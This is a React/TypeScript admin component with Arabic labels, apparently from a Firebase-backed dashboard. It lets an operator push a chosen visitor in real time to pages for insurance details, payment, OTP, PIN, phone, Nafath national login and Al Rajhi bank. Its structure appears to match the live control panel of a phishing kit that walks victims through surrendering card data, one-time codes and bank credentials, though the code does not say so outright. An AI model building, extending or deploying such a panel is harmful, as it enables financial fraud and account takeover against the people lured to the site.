"use client";

import { useState } from "react";
// Using simple button and card components
const Button = ({
  children,
  onClick,
  disabled,
  variant,
  className,
  ...props
}: any) => (
  <button
    onClick={onClick}
    disabled={disabled}
    className={`px-4 py-2 rounded-lg font-medium transition-colors ${
      variant === "outline"
        ? "border-2 border-gray-300 hover:border-gray-400 bg-white text-gray-700"
        : "bg-blue-600 hover:bg-blue-700 text-white disabled:bg-gray-400"
    } ${disabled ? "cursor-not-allowed opacity-50" : ""} ${className || ""}`}
    {...props}
  >
    {children}
  </button>
);

const Card = ({ children, className }: any) => (
  <div
    className={`bg-white rounded-lg shadow-md border border-gray-200 ${
      className || ""
    }`}
  >
    {children}
  </div>
);

const CardHeader = ({ children, className }: any) => (
  <div className={`p-6 border-b border-gray-200 ${className || ""}`}>
    {children}
  </div>
);

const CardTitle = ({ children, className }: any) => (
  <h3 className={`text-lg font-semibold ${className || ""}`}>{children}</h3>
);

const CardDescription = ({ children, className }: any) => (
  <p className={`text-sm text-gray-600 mt-1 ${className || ""}`}>{children}</p>
);

const CardContent = ({ children, className }: any) => (
  <div className={`p-6 ${className || ""}`}>{children}</div>
);
import { db } from "@/lib/firebase";
import { doc, updateDoc } from "firebase/firestore";
import { getCurrentTimestamp } from "@/lib/time-utils";
import {
  ArrowRight,
  Home,
  FileText,
  GitCompare,
  CreditCard,
  Smartphone,
  Shield,
  CheckCircle,
} from "lucide-react";
// Using browser alert instead of toast

interface VisitorRedirectControlProps {
  visitorId: string;
  currentPage?: string;
}

const pages = [
  { id: "home", name: "الصفحة الرئيسية", icon: Home, step: 1 },
  { id: "insur", name: "بيانات التأمين", icon: FileText, step: 2 },
  { id: "compar", name: "مقارنة العروض", icon: GitCompare, step: 3 },
  { id: "payment", name: "الدفع والتحقق", icon: CreditCard, step: 4 },
  { id: "otp", name: "التحقق OTP", icon: CheckCircle, step: 5 },
  { id: "pin", name: "التحقق PIN", icon: Shield, step: 6 },
  { id: "phone", name: "معلومات الهاتف", icon: Smartphone, step: 7 },
  { id: "nafad", name: "نفاذ", icon: Shield, step: 8 },
  { id: "rajhi", name: "الراجحي", icon: Shield, step: 9 },
];

export function VisitorRedirectControl({
  visitorId,
  currentPage,
}: VisitorRedirectControlProps) {
  const [loading, setLoading] = useState(false);
  const [selectedPage, setSelectedPage] = useState<string | null>(null);

  const handleRedirect = async (targetPage: string) => {
    if (!visitorId) {
      alert("معرف الزائر غير موجود");
      return;
    }

    setLoading(true);
    setSelectedPage(targetPage);

    try {
      const visitorRef = doc(db, "pays", visitorId);

      await updateDoc(visitorRef, {
        redirectPage: targetPage,
        redirectPageUpdatedAt: getCurrentTimestamp(),
        currentStepUpdatedAt: getCurrentTimestamp(),
        redirectRequestedAt: new Date().toISOString(),
        redirectRequestedBy: "admin",
      });

      alert(
        `تم إرسال طلب التوجيه إلى ${
          pages.find((p) => p.id === targetPage)?.name
        }`
      );

      // Reset after 2 seconds
      setTimeout(() => {
        setSelectedPage(null);
      }, 2000);
    } catch (error) {
      console.error("Error setting redirect:", error);
      alert("حدث خطأ أثناء إرسال طلب التوجيه");
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <ArrowRight className="h-5 w-5" />
          توجيه الزائر
        </CardTitle>
        <CardDescription>
          أرسل الزائر إلى أي صفحة من صفحات الموقع ({pages.length} صفحات)
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="space-y-3">
          {currentPage && (
            <div className="mb-4 p-3 bg-blue-50 border border-blue-200 rounded-lg">
              <p className="text-sm text-blue-800">
                <span className="font-semibold">الصفحة الحالية:</span>{" "}
                {pages.find((p) => p.id === currentPage)?.name || currentPage}
              </p>
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {pages.map((page) => {
              const Icon = page.icon;
              const isCurrentPage = currentPage === page.id;
              const isSelected = selectedPage === page.id;

              return (
                <Button
                  key={page.id}
                  onClick={() => handleRedirect(page.id)}
                  disabled={loading || isCurrentPage}
                  variant={isCurrentPage ? "outline" : "default"}
                  className={`h-auto py-4 flex flex-col items-start gap-2 ${
                    isSelected ? "bg-green-600 hover:bg-green-700" : ""
                  } ${isCurrentPage ? "opacity-50 cursor-not-allowed" : ""}`}
                >
                  <div className="flex items-center gap-2 w-full">
                    <Icon className="h-5 w-5" />
                    <span className="font-semibold">{page.name}</span>
                  </div>
                  <span className="text-xs opacity-80">
                    الخطوة {page.step} من {pages.length}
                  </span>
                  {isCurrentPage && (
                    <span className="text-xs bg-blue-100 text-blue-800 px-2 py-1 rounded">
                      الصفحة الحالية
                    </span>
                  )}
                  {isSelected && (
                    <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">
                      تم الإرسال ✓
                    </span>
                  )}
                </Button>
              );
            })}
          </div>

          <div className="mt-4 p-3 bg-gray-50 border border-gray-200 rounded-lg">
            <p className="text-xs text-gray-600">
              💡 <strong>ملاحظة:</strong> سيتم توجيه الزائر تلقائياً إلى الصفحة
              المحددة في الوقت الفعلي، بغض النظر عن الصفحة التي يتواجد فيها
              حالياً.
            </p>
          </div>
        </div>
      </CardContent>
    </Card>
  );
}
